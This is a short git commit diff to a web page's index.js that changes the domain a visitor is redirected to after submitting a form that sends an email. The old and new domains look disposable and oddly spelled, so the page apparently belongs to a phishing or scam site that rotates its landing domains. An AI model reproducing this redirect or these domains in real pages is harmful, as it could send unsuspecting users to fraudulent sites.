096924732a88b4b7b3c76c7f262541ae77ddcbfa
husknet <127146284+husknet@users.noreply.github.com>
2024-11-28 13:10:45 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sc.aloline-ovveb.shop';
+        window.location.href = 'https://sc.fout-foline.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
